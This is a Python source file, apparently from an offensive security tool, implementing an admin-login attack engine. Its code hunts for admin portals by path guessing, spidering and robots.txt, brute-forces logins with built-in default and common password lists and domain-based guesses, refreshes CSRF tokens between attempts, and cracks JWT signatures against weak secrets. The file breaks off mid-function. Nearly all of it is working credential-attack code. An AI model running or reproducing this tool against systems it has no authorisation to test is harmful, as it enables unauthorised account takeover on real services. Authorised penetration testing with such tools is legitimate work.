#!/usr/bin/env python3
"""
Agent DS - Admin Login Testing Engine
Advanced authentication bypass and privilege escalation testing

This module handles comprehensive admin portal attacks including:
- Admin portal discovery
- Credential brute force attacks (Hydra/Patator integration)
- Session token analysis and manipulation
- MFA bypass testing
- Password policy analysis
- Authentication bypass techniques
- Session fixation and hijacking tests

Author: Agent DS Team
Version: 2.0
Date: September 16, 2025
"""

import asyncio
import json
import re
import time
import hashlib
import base64
import random
import string
from typing import Dict, List, Set, Optional, Any, Tuple
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import subprocess
import tempfile
import os
from bs4 import BeautifulSoup
import jwt
from datetime import datetime, timedelta
import concurrent.futures

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class AdminLoginEngine:
    """
    Advanced admin login and authentication testing engine
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
        
        # Common admin portal paths
        self.admin_paths = [
            '/admin', '/admin/', '/admin/login', '/admin/login.php', '/admin/index.php',
            '/administrator', '/administrator/', '/administrator/login', '/administrator/index.php',
            '/wp-admin', '/wp-admin/', '/wp-login.php',
            '/cpanel', '/cpanel/', '/cPanel', '/cPanel/',
            '/panel', '/panel/', '/control', '/control/',
            '/manager', '/manager/', '/management', '/management/',
            '/backend', '/backend/', '/back', '/back/',
            '/console', '/console/', '/dashboard', '/dashboard/',
            '/secure', '/secure/', '/private', '/private/',
            '/login', '/login/', '/signin', '/signin/', '/auth', '/auth/',
            '/user', '/user/', '/users', '/users/',
            '/account', '/account/', '/accounts', '/accounts/',
            '/staff', '/staff/', '/employee', '/employee/',
            '/super', '/super/', '/superuser', '/superuser/',
            '/root', '/root/', '/sysadmin', '/sysadmin/',
            '/webmaster', '/webmaster/', '/web', '/web/',
            '/adm', '/adm/', '/admin1', '/admin2', '/admin3',
            '/administrator1', '/administrator2',
            '/adminarea', '/adminarea/', '/admin_area', '/admin_area/',
            '/adminpanel', '/adminpanel/', '/admin_panel', '/admin_panel/',
            '/controlpanel', '/controlpanel/', '/control_panel', '/control_panel/',
            '/admincontrol', '/admincontrol/', '/admin_control', '/admin_control/',
            '/admin_login', '/admin_login/', '/adminlogin', '/adminlogin/',
            '/admin.php', '/admin.html', '/admin.asp', '/admin.aspx',
            '/administrator.php', '/administrator.html',
            '/login.php', '/login.html', '/login.asp', '/login.aspx',
            '/signin.php', '/signin.html', '/signin.asp', '/signin.aspx',
            '/auth.php', '/auth.html', '/auth.asp', '/auth.aspx',
            '/secure.php', '/secure.html', '/secure.asp', '/secure.aspx'
        ]
        
        # Common default credentials
        self.default_credentials = [
            ('admin', 'admin'), ('admin', 'password'), ('admin', '123456'),
            ('admin', 'admin123'), ('admin', 'root'), ('admin', ''),
            ('administrator', 'administrator'), ('administrator', 'password'),
            ('administrator', 'admin'), ('administrator', '123456'),
            ('root', 'root'), ('root', 'admin'), ('root', 'password'),
            ('root', 'toor'), ('root', '123456'), ('root', ''),
            ('sa', ''), ('sa', 'sa'), ('sa', 'admin'), ('sa', 'password'),
            ('user', 'user'), ('user', 'password'), ('user', '123456'),
            ('guest', 'guest'), ('guest', 'password'), ('guest', ''),
            ('test', 'test'), ('test', 'password'), ('test', '123456'),
            ('demo', 'demo'), ('demo', 'password'), ('demo', '123456'),
            ('operator', 'operator'), ('operator', 'password'),
            ('manager', 'manager'), ('manager', 'password'),
            ('supervisor', 'supervisor'), ('supervisor', 'password'),
            ('webmaster', 'webmaster'), ('webmaster', 'password'),
            ('ftpuser', 'ftpuser'), ('ftpuser', 'password'),
            ('mysql', 'mysql'), ('postgres', 'postgres'),
            ('oracle', 'oracle'), ('mssql', 'mssql'),
            ('admin', 'qwerty'), ('admin', 'letmein'), ('admin', 'welcome'),
            ('admin', 'monkey'), ('admin', 'dragon'), ('admin', 'master'),
            ('admin', 'shadow'), ('admin', 'superman'), ('admin', 'michael'),
            ('admin', 'password1'), ('admin', 'password123'),
            ('admin', '12345'), ('admin', '1234'), ('admin', '12345678'),
            ('admin', 'abc123'), ('admin', 'iloveyou'), ('admin', 'princess'),
            ('admin', 'rockyou'), ('admin', 'sunshine'), ('admin', 'nicole')
        ]
        
        # Common username variations
        self.username_variations = [
            'admin', 'administrator', 'root', 'sa', 'user', 'guest',
            'test', 'demo', 'operator', 'manager', 'supervisor',
            'webmaster', 'ftpuser', 'mysql', 'postgres', 'oracle',
            'mssql', 'support', 'service', 'system', 'backup',
            'maintenance', 'staff', 'employee', 'super', 'superuser',
            'power', 'poweruser', 'owner', 'master', 'chief',
            'boss', 'director', 'president', 'ceo', 'cto',
            'developer', 'dev', 'tester', 'qa', 'security'
        ]
        
        # Common password variations
        self.password_variations = [
            'password', 'admin', '123456', '12345678', 'qwerty',
            'abc123', 'password123', 'admin123', 'letmein',
            'welcome', 'monkey', 'dragon', 'master', 'shadow',
            'superman', 'michael', 'password1', '12345', '1234',
            'iloveyou', 'princess', 'rockyou', 'sunshine', 'nicole',
            'football', 'baseball', 'soccer', 'basketball', 'hockey',
            'secret', 'god', 'love', 'sex', 'money', 'live',
            'forever', 'charlie', 'hello', 'liverpool', 'buster',
            'rabbit', 'cheese', 'liverpool', 'access', 'master',
            'jordan', 'harley', 'ranger', 'shadow', 'player',
            'tiger', 'passw0rd', 'p@ssw0rd', 'p@ssword', 'Password',
            'Password1', 'Password123', 'Welcome1', 'Welcome123'
        ]
        
        # Session token patterns
        self.session_patterns = [
            r'JSESSIONID=([A-F0-9]+)',
            r'PHPSESSID=([a-z0-9]+)',
            r'ASPSESSIONID[A-Z]{8}=([A-Z]+)',
            r'session_id=([a-z0-9]+)',
            r'sessionid=([a-z0-9]+)',
            r'sid=([a-z0-9]+)',
            r'token=([A-Za-z0-9+/=]+)',
            r'auth_token=([A-Za-z0-9+/=]+)',
            r'csrf_token=([A-Za-z0-9+/=]+)',
            r'xsrf_token=([A-Za-z0-9+/=]+)'
        ]
        
        # JWT secret keys to test
        self.jwt_secrets = [
            'secret', 'key', 'jwt', 'token', 'auth', 'admin',
            'password', '123456', 'qwerty', 'abc123', 'secret123',
            'mysecret', 'mykey', 'jwtkey', 'jwtsecret', 'authkey',
            'secretkey', 'supersecret', 'topsecret', 'confidential',
            'private', 'signature', 'sign', 'hmac', 'sha256'
        ]
    
    async def discover_admin_portals(self, target_url: str) -> List[Dict[str, Any]]:
        """
        Discover admin portals and login pages
        """
        portals = []
        base_url = urlparse(target_url)
        base_domain = f"{base_url.scheme}://{base_url.netloc}"
        
        # Test common admin paths
        portal_results = await self._test_admin_paths(base_domain)
        portals.extend(portal_results)
        
        # Spider the website for login forms
        spider_results = await self._spider_for_login_forms(target_url)
        portals.extend(spider_results)
        
        # Check robots.txt for hidden paths
        robots_results = await self._check_robots_txt(base_domain)
        portals.extend(robots_results)
        
        # Remove duplicates
        unique_portals = []
        seen_urls = set()
        for portal in portals:
            url = portal.get('url')
            if url and url not in seen_urls:
                unique_portals.append(portal)
                seen_urls.add(url)
        
        return unique_portals
    
    async def _test_admin_paths(self, base_url: str) -> List[Dict[str, Any]]:
        """Test common admin portal paths"""
        portals = []
        
        async def test_path(path):
            url = base_url + path
            try:
                response = await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: self.session.get(url, timeout=10, allow_redirects=True)
                )
                
                if response.status_code in [200, 401, 403]:
                    # Analyze response for admin indicators
                    admin_score = self._analyze_admin_response(response)
                    
                    if admin_score > 0:
                        return {
                            'url': url,
                            'status_code': response.status_code,
                            'admin_score': admin_score,
                            'title': self._extract_title(response.text),
                            'login_form': self._has_login_form(response.text),
                            'method': 'path_brute_force'
                        }
            except Exception:
                pass
            return None
        
        # Test paths concurrently
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            tasks = [executor.submit(asyncio.create_task, test_path(path)) for path in self.admin_paths]
            
            for future in concurrent.futures.as_completed(tasks):
                try:
                    result = await future.result()
                    if result:
                        portals.append(result)
                except Exception:
                    continue
        
        return portals
    
    def _analyze_admin_response(self, response) -> int:
        """Analyze response for admin portal indicators"""
        score = 0
        content = response.text.lower()
        
        # Check for admin keywords
        admin_keywords = [
            'admin', 'administrator', 'management', 'control panel',
            'dashboard', 'login', 'signin', 'authentication',
            'username', 'password', 'login form', 'admin panel',
            'administration', 'backend', 'cpanel', 'control'
        ]
        
        for keyword in admin_keywords:
            if keyword in content:
                score += 5
        
        # Check for login form elements
        form_elements = [
            '<form', 'type="password"', 'name="password"',
            'id="password"', 'name="username"', 'id="username"',
            'name="login"', 'id="login"', 'type="submit"'
        ]
        
        for element in form_elements:
            if element in content:
                score += 10
        
        # Check title
        title = self._extract_title(response.text)
        if title:
            title_lower = title.lower()
            title_keywords = ['admin', 'login', 'management', 'control', 'dashboard']
            for keyword in title_keywords:
                if keyword in title_lower:
                    score += 15
        
        # Check for protected areas (401/403)
        if response.status_code in [401, 403]:
            score += 20
        
        return score
    
    def _extract_title(self, html: str) -> str:
        """Extract page title"""
        try:
            soup = BeautifulSoup(html, 'html.parser')
            title = soup.find('title')
            return title.text.strip() if title else ''
        except Exception:
            return ''
    
    def _has_login_form(self, html: str) -> bool:
        """Check if page has a login form"""
        try:
            soup = BeautifulSoup(html, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                inputs = form.find_all('input')
                has_password = any(inp.get('type') == 'password' for inp in inputs)
                has_text_or_username = any(
                    inp.get('type') in ['text', 'email'] or 
                    inp.get('name', '').lower() in ['username', 'user', 'login', 'email']
                    for inp in inputs
                )
                
                if has_password and has_text_or_username:
                    return True
            
            return False
        except Exception:
            return False
    
    async def _spider_for_login_forms(self, target_url: str) -> List[Dict[str, Any]]:
        """Spider website to find login forms"""
        portals = []
        crawled_urls = set()
        to_crawl = [target_url]
        
        while to_crawl and len(crawled_urls) < 20:  # Limit crawling
            current_url = to_crawl.pop(0)
            
            if current_url in crawled_urls:
                continue
            
            try:
                response = await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: self.session.get(current_url, timeout=10)
                )
                
                if response.status_code == 200:
                    crawled_urls.add(current_url)
                    
                    # Check for login forms
                    if self._has_login_form(response.text):
                        admin_score = self._analyze_admin_response(response)
                        portals.append({
                            'url': current_url,
                            'status_code': response.status_code,
                            'admin_score': admin_score,
                            'title': self._extract_title(response.text),
                            'login_form': True,
                            'method': 'spider'
                        })
                    
                    # Extract links for further crawling
                    base_domain = f"{urlparse(target_url).scheme}://{urlparse(target_url).netloc}"
                    links = self._extract_links(response.text, base_domain)
                    
                    for link in links[:5]:  # Limit links per page
                        if link not in crawled_urls and len(crawled_urls) < 20:
                            to_crawl.append(link)
            
            except Exception:
                continue
        
        return portals
    
    def _extract_links(self, html: str, base_domain: str) -> List[str]:
        """Extract links from HTML"""
        links = []
        
        try:
            soup = BeautifulSoup(html, 'html.parser')
            anchor_tags = soup.find_all('a', href=True)
            
            for anchor in anchor_tags:
                href = anchor['href']
                
                if href.startswith('/'):
                    full_url = base_domain + href
                elif href.startswith('http') and base_domain in href:
                    full_url = href
                else:
                    continue
                
                # Look for login-related paths
                login_indicators = [
                    'login', 'signin', 'auth', 'admin', 'management',
                    'control', 'panel', 'dashboard', 'backend'
                ]
                
                if any(indicator in href.lower() for indicator in login_indicators):
                    links.append(full_url)
        
        except Exception:
            pass
        
        return links
    
    async def _check_robots_txt(self, base_url: str) -> List[Dict[str, Any]]:
        """Check robots.txt for hidden admin paths"""
        portals = []
        robots_url = base_url + '/robots.txt'
        
        try:
            response = await asyncio.get_event_loop().run_in_executor(
                None,
                lambda: self.session.get(robots_url, timeout=10)
            )
            
            if response.status_code == 200:
                robots_content = response.text
                
                # Extract disallowed paths
                disallow_pattern = r'Disallow:\s*(.+)'
                disallowed_paths = re.findall(disallow_pattern, robots_content, re.IGNORECASE)
                
                for path in disallowed_paths:
                    path = path.strip()
                    if path and path != '/':
                        # Check if path looks like admin area
                        admin_indicators = [
                            'admin', 'management', 'control', 'panel',
                            'dashboard', 'backend', 'private', 'secure'
                        ]
                        
                        if any(indicator in path.lower() for indicator in admin_indicators):
                            test_url = base_url + path
                            
                            try:
                                test_response = await asyncio.get_event_loop().run_in_executor(
                                    None,
                                    lambda: self.session.get(test_url, timeout=10)
                                )
                                
                                if test_response.status_code in [200, 401, 403]:
                                    admin_score = self._analyze_admin_response(test_response)
                                    
                                    if admin_score > 0:
                                        portals.append({
                                            'url': test_url,
                                            'status_code': test_response.status_code,
                                            'admin_score': admin_score,
                                            'title': self._extract_title(test_response.text),
                                            'login_form': self._has_login_form(test_response.text),
                                            'method': 'robots_txt'
                                        })
                            
                            except Exception:
                                continue
        
        except Exception:
            pass
        
        return portals
    
    async def test_credentials(self, portal_url: str) -> Dict[str, Any]:
        """
        Test credentials against admin portal
        """
        results = {
            'success': False,
            'valid_credentials': [],
            'tested_combinations': 0,
            'locked_out': False,
            'rate_limited': False,
            'response_analysis': {}
        }
        
        # Get login form details
        form_data = await self._analyze_login_form(portal_url)
        if not form_data:
            results['error'] = 'No login form found'
            return results
        
        # Test default credentials
        default_results = await self._test_default_credentials(portal_url, form_data)
        results.update(default_results)
        
        if not results['success']:
            # Test common username/password combinations
            common_results = await self._test_common_credentials(portal_url, form_data)
            results.update(common_results)
        
        if not results['success']:
            # Test credential mutations
            mutation_results = await self._test_credential_mutations(portal_url, form_data)
            results.update(mutation_results)
        
        return results
    
    async def _analyze_login_form(self, portal_url: str) -> Optional[Dict[str, Any]]:
        """Analyze login form structure"""
        try:
            response = await asyncio.get_event_loop().run_in_executor(
                None,
                lambda: self.session.get(portal_url, timeout=10)
            )
            
            if response.status_code != 200:
                return None
            
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            for form in forms:
                inputs = form.find_all('input')
                has_password = any(inp.get('type') == 'password' for inp in inputs)
                
                if has_password:
                    # Extract form details
                    form_data = {
                        'action': form.get('action', ''),
                        'method': form.get('method', 'POST').upper(),
                        'fields': {},
                        'csrf_token': None,
                        'hidden_fields': {}
                    }
                    
                    # Build action URL
                    if form_data['action']:
                        if form_data['action'].startswith('http'):
                            form_data['action_url'] = form_data['action']
                        else:
                            form_data['action_url'] = urljoin(portal_url, form_data['action'])
                    else:
                        form_data['action_url'] = portal_url
                    
                    # Extract field information
                    for inp in inputs:
                        name = inp.get('name', '')
                        input_type = inp.get('type', 'text')
                        value = inp.get('value', '')
                        
                        if name:
                            if input_type == 'password':
                                form_data['fields']['password'] = name
                            elif input_type in ['text', 'email']:
                                # Determine if this is username field
                                if any(keyword in name.lower() for keyword in ['user', 'login', 'email']):
                                    form_data['fields']['username'] = name
                                else:
                                    form_data['fields']['username'] = name  # Default to first text field
                            elif input_type == 'hidden':
                                form_data['hidden_fields'][name] = value
                                # Check for CSRF tokens
                                if any(token in name.lower() for token in ['csrf', 'xsrf', 'token']):
                                    form_data['csrf_token'] = value
                            elif input_type == 'submit':
                                form_data['submit_name'] = name
                                form_data['submit_value'] = value
                    
                    return form_data
            
            return None
        
        except Exception:
            return None
    
    async def _test_default_credentials(self, portal_url: str, form_data: Dict) -> Dict[str, Any]:
        """Test default credential combinations"""
        results = {
            'success': False,
            'valid_credentials': [],
            'tested_combinations': 0,
            'locked_out': False,
            'rate_limited': False
        }
        
        for username, password in self.default_credentials[:20]:  # Test first 20 combinations
            if results['locked_out'] or results['rate_limited']:
                break
            
            test_result = await self._test_single_credential(portal_url, form_data, username, password)
            results['tested_combinations'] += 1
            
            if test_result['success']:
                results['success'] = True
                results['valid_credentials'].append({
                    'username': username,
                    'password': password,
                    'response_code': test_result['status_code'],
                    'evidence': test_result['evidence']
                })
                break
            elif test_result['locked_out']:
                results['locked_out'] = True
                break
            elif test_result['rate_limited']:
                results['rate_limited'] = True
                await asyncio.sleep(5)  # Wait before continuing
        
        return results
    
    async def _test_common_credentials(self, portal_url: str, form_data: Dict) -> Dict[str, Any]:
        """Test common username/password combinations"""
        results = {
            'success': False,
            'valid_credentials': [],
            'tested_combinations': 0,
            'locked_out': False,
            'rate_limited': False
        }
        
        # Test top usernames with top passwords
        for username in self.username_variations[:10]:
            if results['locked_out'] or results['rate_limited']:
                break
            
            for password in self.password_variations[:10]:
                if results['locked_out'] or results['rate_limited']:
                    break
                
                test_result = await self._test_single_credential(portal_url, form_data, username, password)
                results['tested_combinations'] += 1
                
                if test_result['success']:
                    results['success'] = True
                    results['valid_credentials'].append({
                        'username': username,
                        'password': password,
                        'response_code': test_result['status_code'],
                        'evidence': test_result['evidence']
                    })
                    return results
                elif test_result['locked_out']:
                    results['locked_out'] = True
                    break
                elif test_result['rate_limited']:
                    results['rate_limited'] = True
                    await asyncio.sleep(2)
                
                # Add small delay to avoid rate limiting
                await asyncio.sleep(0.5)
        
        return results
    
    async def _test_credential_mutations(self, portal_url: str, form_data: Dict) -> Dict[str, Any]:
        """Test credential mutations based on domain/company name"""
        results = {
            'success': False,
            'valid_credentials': [],
            'tested_combinations': 0,
            'locked_out': False,
            'rate_limited': False
        }
        
        # Extract domain name for mutations
        domain = urlparse(portal_url).netloc
        domain_parts = domain.split('.')
        company_name = domain_parts[0] if domain_parts else 'company'
        
        # Generate mutations
        mutations = [
            company_name,
            company_name + '123',
            company_name + '2023',
            company_name + '2024',
            company_name + '2025',
            company_name + 'admin',
            'admin' + company_name,
            company_name.upper(),
            company_name.capitalize()
        ]
        
        base_usernames = ['admin', 'administrator', 'root', company_name]
        
        for username in base_usernames:
            if results['locked_out'] or results['rate_limited']:
                break
            
            for password in mutations:
                if results['locked_out'] or results['rate_limited']:
                    break
                
                test_result = await self._test_single_credential(portal_url, form_data, username, password)
                results['tested_combinations'] += 1
                
                if test_result['success']:
                    results['success'] = True
                    results['valid_credentials'].append({
                        'username': username,
                        'password': password,
                        'response_code': test_result['status_code'],
                        'evidence': test_result['evidence']
                    })
                    return results
                elif test_result['locked_out']:
                    results['locked_out'] = True
                    break
                elif test_result['rate_limited']:
                    results['rate_limited'] = True
                    await asyncio.sleep(3)
                
                await asyncio.sleep(1)  # Longer delay for mutations
        
        return results
    
    async def _test_single_credential(self, portal_url: str, form_data: Dict, 
                                    username: str, password: str) -> Dict[str, Any]:
        """Test a single credential combination"""
        result = {
            'success': False,
            'status_code': 0,
            'evidence': '',
            'locked_out': False,
            'rate_limited': False
        }
        
        try:
            # Prepare login data
            login_data = {}
            
            # Add credentials
            if 'username' in form_data['fields']:
                login_data[form_data['fields']['username']] = username
            if 'password' in form_data['fields']:
                login_data[form_data['fields']['password']] = password
            
            # Add hidden fields
            login_data.update(form_data['hidden_fields'])
            
            # Add submit button if present
            if 'submit_name' in form_data and 'submit_value' in form_data:
                login_data[form_data['submit_name']] = form_data['submit_value']
            
            # Refresh CSRF token if needed
            if form_data.get('csrf_token'):
                fresh_token = await self._get_fresh_csrf_token(portal_url, form_data)
                if fresh_token:
                    # Find CSRF field name and update
                    for field_name, field_value in form_data['hidden_fields'].items():
                        if any(token in field_name.lower() for token in ['csrf', 'xsrf', 'token']):
                            login_data[field_name] = fresh_token
                            break
            
            # Perform login attempt
            if form_data['method'] == 'GET':
                response = await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: self.session.get(form_data['action_url'], params=login_data, timeout=15, allow_redirects=True)
                )
            else:
                response = await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: self.session.post(form_data['action_url'], data=login_data, timeout=15, allow_redirects=True)
                )
            
            result['status_code'] = response.status_code
            
            # Analyze response for success indicators
            success_indicators = [
                'welcome', 'dashboard', 'logout', 'profile', 'admin panel',
                'control panel', 'management', 'administration', 'settings',
                'welcome back', 'successfully logged in', 'login successful'
            ]
            
            failure_indicators = [
                'invalid', 'incorrect', 'failed', 'error', 'denied',
                'wrong', 'login failed', 'authentication failed',
                'access denied', 'unauthorized', 'forbidden'
            ]
            
            lockout_indicators = [
                'locked', 'disabled', 'suspended', 'blocked',
                'too many attempts', 'account locked', 'temporarily disabled'
            ]
            
            rate_limit_indicators = [
                'rate limit', 'too many requests', 'slow down',
                'try again later', 'temporarily unavailable'
            ]
            
            response_text = response.text.lower()
            
            # Check for lockout
            for indicator in lockout_indicators:
                if indicator in response_text:
                    result['locked_out'] = True
                    result['evidence'] = f'Account lockout detected: {indicator}'
                    return result
            
            # Check for rate limiting
            for indicator in rate_limit_indicators:
                if indicator in response_text:
                    result['rate_limited'] = True
                    result['evidence'] = f'Rate limiting detected: {indicator}'
                    return result
            
            # Check for success
            success_score = 0
            for indicator in success_indicators:
                if indicator in response_text:
                    success_score += 1
                    result['evidence'] += f'Success indicator: {indicator}; '
            
            # Check for failure
            failure_score = 0
            for indicator in failure_indicators:
                if indicator in response_text:
                    failure_score += 1
                    result['evidence'] += f'Failure indicator: {indicator}; '
            
            # Check redirects
            if response.status_code in [302, 301] and response.history:
                redirect_url = response.url.lower()
                success_redirect_indicators = [
                    'dashboard', 'admin', 'panel', 'management', 'profile', 'home'
                ]
                
                for indicator in success_redirect_indicators:
                    if indicator in redirect_url:
                        success_score += 2
                        result['evidence'] += f'Success redirect to: {response.url}; '
                        break
            
            # Check for different response length (possible success)
            if not hasattr(self, '_baseline_response_length'):
                self._baseline_response_length = len(response.text)
            else:
                if abs(len(response.text) - self._baseline_response_length) > 500:
                    success_score += 1
                    result['evidence'] += f'Response length difference: {len(response.text)} vs {self._baseline_response_length}; '
            
            # Determine success
            if success_score > failure_score and success_score > 0:
                result['success'] = True
            elif response.status_code == 200 and failure_score == 0 and len(response.text) > 1000:
                # Possible success if no failure indicators and substantial content
                result['success'] = True
                result['evidence'] += 'No failure indicators, substantial content; '
            
        except Exception as e:
            result['evidence'] = f'Request failed: {str(e)}'
        
        return result
    
    async def _get_fresh_csrf_token(self, portal_url: str, form_data: Dict) -> Optional[str]:
        """Get a fresh CSRF token"""
        try:
            response = await asyncio.get_event_loop().run_in_executor(
                None,
                lambda: self.session.get(portal_url, timeout=10)
            )
            
            if response.status_code == 200:
                # Extract CSRF token from response
                for pattern in [r'csrf[_-]?token["\'\s]*[:=]["\'\s]*([a-zA-Z0-9+/=]+)',
                               r'_token["\'\s]*[:=]["\'\s]*([a-zA-Z0-9+/=]+)',
                               r'authenticity_token["\'\s]*[:=]["\'\s]*([a-zA-Z0-9+/=]+)']:
                    match = re.search(pattern, response.text, re.IGNORECASE)
                    if match:
                        return match.group(1)
            
            return None
        
        except Exception:
            return None
    
    async def analyze_session_tokens(self, target_url: str) -> Dict[str, Any]:
        """
        Analyze session tokens and cookies for vulnerabilities
        """
        results = {
            'session_tokens': [],
            'jwt_tokens': [],
            'weak_tokens': [],
            'predictable_tokens': [],
            'security_issues': []
        }
        
        # Collect session tokens
        tokens = await self._collect_session_tokens(target_url)
        
        for token_data in tokens:
            token_value = token_data['value']
            token_name = token_data['name']
            
            # Analyze token structure
            analysis = self._analyze_token_structure(token_value, token_name)
            analysis.update(token_data)
            
            # Check if it's a JWT
            if self._is_jwt_token(token_value):
                jwt_analysis = await self._analyze_jwt_token(token_value)
                analysis.update(jwt_analysis)
                results['jwt_tokens'].append(analysis)
            else:
                results['session_tokens'].append(analysis)
            
            # Check for security issues
            security_issues = self._check_token_security(analysis)
            results['security_issues'].extend(security_issues)
            
            # Check for weak/predictable tokens
            if analysis.get('entropy', 0) < 50:
                results['weak_tokens'].append(analysis)
            
            if analysis.get('predictable', False):
                results['predictable_tokens'].append(analysis)
        
        return results
    
    async def _collect_session_tokens(self, target_url: str) -> List[Dict[str, Any]]:
        """Collect session tokens from multiple requests"""
        tokens = []
        
        # Make multiple requests to collect different tokens
        for i in range(5):
            try:
                response = await asyncio.get_event_loop().run_in_executor(
                    None,
                    lambda: self.session.get(target_url, timeout=10)
                )
                
                # Extract cookies
                for cookie in response.cookies:
                    tokens.append({
                        'name': cookie.name,
                        'value': cookie.value,
                        'domain': cookie.domain,
                        'path': cookie.path,
                        'secure': cookie.secure,
                        'httponly': getattr(cookie, 'httponly', False),
                        'expires': getattr(cookie, 'expires', None),
                        'source': 'cookie'
                    })
                
                # Extract tokens from HTML
                html_tokens = self._extract_html_tokens(response.text)
                tokens.extend(html_tokens)
                
                # Extract tokens from headers
                header_tokens = self._extract_header_tokens(response.headers)
                tokens.extend(header_tokens)
                
                await asyncio.sleep(1)  # Wait between requests
                
            except Exception:
                continue
        
        # Remove duplicates
        unique_tokens = []
        seen_values = set()
        for token in tokens:
            if token['value'] not in seen_values:
                unique_tokens.append(token)
                seen_values.add(token['value'])
        
        return unique_tokens
    
    def _extract_html_tokens(self, html: str) -> List[Dict[str, Any]]:
        """Extract tokens from HTML content"""
        tokens = []
        
        # Common token patterns in HTML
        token_patterns = [
            (r'csrf[_-]?token["\'\s]*[:=]["\'\s]*([a-zA-Z0-9+/=]+)', 'csrf_token'),
            (r'_token["\'\s]*[:=]["\'\s]*([a-zA-Z0-9+/=]+)', 'form_token'),
            (r'authenticity_token["\'\s]*[:=]["\'\s]*([a-zA-Z0-9+/=]+)', 'authenticity_token'),
            (r'session[_-]?id["\'\s]*[:=]["\'\s]*([a-zA-Z0-9+/=]+)', 'session_id'),
            (r'api[_-]?key["\'\s]*[:=]["\'\s]*([a-zA-Z0-9+/=]+)', 'api_key'),
            (r'access[_-]?token["\'\s]*[:=]["\'\s]*([a-zA-Z0-9+/=]+)', 'access_token')
        ]
        
        for pattern, token_type in token_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            for match in matches:
                tokens.append({
                    'name': token_type,
                    'value': match,
                    'source': 'html',
                    'type': token_type
                })
        
        return tokens
    
    def _extract_header_tokens(self, headers: Dict) -> List[Dict[str, Any]]:
        """Extract tokens from HTTP headers"""
        tokens = []
        
        token_headers = [
            'Authorization', 'X-Auth-Token', 'X-API-Key', 'X-Session-Token',
            'X-CSRF-Token', 'X-XSRF-Token', 'Authentication', 'Bearer'
        ]
        
        for header_name, header_value in headers.items():
            if header_name in token_headers:
                # Extract token value
                if header_value.startswith('Bearer '):
                    token_value = header_value[7:]
                else:
                    token_value = header_value
                
                tokens.append({
                    'name': header_name,
                    'value': token_value,
                    'source': 'header',
                    'type': 'auth_header'
                })
        
        return tokens
    
    def _analyze_token_structure(self, token_value: str, token_name: str) -> Dict[str, Any]:
        """Analyze token structure and properties"""
        analysis = {
            'length': len(token_value),
            'character_set': set(token_value),
            'entropy': self._calculate_entropy(token_value),
            'base64_encoded': self._is_base64(token_value),
            'hex_encoded': self._is_hex(token_value),
            'predictable': False,
            'structure_analysis': {}
        }
        
        # Check for patterns
        if re.match(r'^[0-9]+$', token_value):
            analysis['structure_analysis']['type'] = 'numeric'
            analysis['predictable'] = True
        elif re.match(r'^[a-f0-9]+$', token_value, re.IGNORECASE):
            analysis['structure_analysis']['type'] = 'hex'
        elif re.match(r'^[A-Za-z0-9+/=]+$', token_value):
            analysis['structure_analysis']['type'] = 'base64_like'
        
        # Check for timestamp patterns
        if self._contains_timestamp(token_value):
            analysis['structure_analysis']['contains_timestamp'] = True
            analysis['predictable'] = True
        
        # Check for common weak patterns
        if len(set(token_value)) < len(token_value) * 0.5:
            analysis['structure_analysis']['low_character_diversity'] = True
            analysis['predictable'] = True
        
        return analysis
    
    def _calculate_entropy(self, token: str) -> float:
        """Calculate Shannon entropy of token"""
        if not token:
            return 0
        
        from collections import Counter
        import math
        
        counts = Counter(token)
        probs = [count / len(token) for count in counts.values()]
        entropy = -sum(p * math.log2(p) for p in probs)
        
        return entropy
    
    def _is_base64(self, token: str) -> bool:
        """Check if token is base64 encoded"""
        try:
            base64.b64decode(token, validate=True)
            return True
        except Exception:
            return False
    
    def _is_hex(self, token: str) -> bool:
        """Check if token is hex encoded"""
        try:
            int(token, 16)
            return len(token) % 2 == 0
        except ValueError:
            return False
    
    def _contains_timestamp(self, token: str) -> bool:
        """Check if token contains timestamp"""
        # Look for Unix timestamp patterns
        timestamp_patterns = [
            r'\b1[6-9]\d{8}\b',  # Unix timestamp (2020-2099)
            r'\b\d{4}-\d{2}-\d{2}\b',  # Date format
            r'\b\d{2}/\d{2}/\d{4}\b'   # Date format
        ]
        
        for pattern in timestamp_patterns:
            if re.search(pattern, token):
                return True
        
        return False
    
    def _is_jwt_token(self, token: str) -> bool:
        """Check if token is a JWT"""
        parts = token.split('.')
        return len(parts) == 3 and all(self._is_base64(part + '==') for part in parts)
    
    async def _analyze_jwt_token(self, token: str) -> Dict[str, Any]:
        """Analyze JWT token"""
        analysis = {
            'is_jwt': True,
            'header': {},
            'payload': {},
            'signature_verified': False,
            'weak_secret': None,
            'algorithm': None,
            'expiration': None
        }
        
        try:
            # Decode header and payload without verification
            header = jwt.get_unverified_header(token)
            payload = jwt.decode(token, options={"verify_signature": False})
            
            analysis['header'] = header
            analysis['payload'] = payload
            analysis['algorithm'] = header.get('alg', 'unknown')
            
            # Check expiration
            if 'exp' in payload:
                exp_timestamp = payload['exp']
                exp_datetime = datetime.fromtimestamp(exp_timestamp)
                analysis['expiration'] = exp_datetime.isoformat()
                analysis['expired'] = exp_datetime < datetime.now()
            
            # Test for weak secrets if algorithm is HMAC
            if header.get('alg', '').startswith('HS'):
                weak_secret = await self._test_jwt_weak_secrets(token)
                if weak_secret:
                    analysis['weak_secret'] = weak_secret
                    analysis['signature_verified'] = True
            
        except Exception as e:
            analysis['decode_error'] = str(e)
        
        return analysis
    
    async def _test_jwt_weak_secrets(self, token: str) -> Optional[str]:
        """Test JWT against common weak secrets"""
        for secret in self.jwt_secrets:
            try:
                jwt.decode(token, secret, algorithms=['HS256', 'HS384', 'HS512'])
                return secret
            except jwt.InvalidSignatureError:
                continue
            except Exception:
